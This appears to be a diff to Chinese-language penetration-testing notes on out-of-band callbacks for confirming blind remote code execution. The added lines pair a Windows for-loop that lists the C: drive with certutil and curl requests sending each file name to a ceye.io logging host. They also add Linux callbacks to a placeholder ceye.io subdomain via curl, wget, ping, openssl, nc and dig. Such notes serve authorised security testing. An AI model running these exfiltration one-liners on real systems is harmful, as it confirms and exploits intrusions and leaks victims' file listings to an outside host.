@@ -16,6 +16,7 @@
 - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
 - [HTTP BLIND](https://web.archive.org/web/20200224073305/https://echocipher.github.io/2019/07/22/HTTP-BLIND/)
 - [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
+- [System Hardening을 피해 RCE를 탐지하기 위한 OOB 방법들](https://www.hahwul.com/2022/03/11/bypass-system-hardening-rce-oob/)
 
 **在线监控平台**
 - http://ceye.io/
@@ -48,7 +49,7 @@
 
 ---
 
-# HTTP
+## rce
 
 **Windows**
 
@@ -56,12 +57,51 @@
 
     使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
     ```bash
-    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://127.0.0.1:8000/?result=%x" nul
+    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://xxx.ceye.io/?result=%x" nul
     ```
 
 - curl
 
-    win10 等环境支持 curl
+    windows 环境默认是支持 curl 的
     ```bash
-    for /F %x in ('dir /b c:\') do curl http://127.0.0.1:8000/%x
+    for /F %x in ('dir /b c:\') do curl http://xxx.ceye.io/%x
+    ```
+
+**linux**
+
+- curl
+
+    ```
+    curl http://xxx.ceye.io/%x
+    ```
+
+- wget
+
+    ```
+    wget http://xxx.ceye.io/%x
+    ```
+
+- ping
+
+    linux 默认 ping 不带 -c 参数是会导致无限ping下去的,一定要带 -c
+    ```bash
+    ping -c 4 xxx.ceye.io
+    ```
+
+- openssl
+
+    ```
+    openssl s_client -connect xxx.ceye.io:80
+    ```
+
+- nc
+
+    ```
+    echo -e "GET / HTTP/1.1\nHost: http://xxx.ceye.io/%x\n\n" | nc xxx.ceye.io 80
+    ```
+
+- dig
+
+    ```
+    dig xxx.ceye.io
     ```
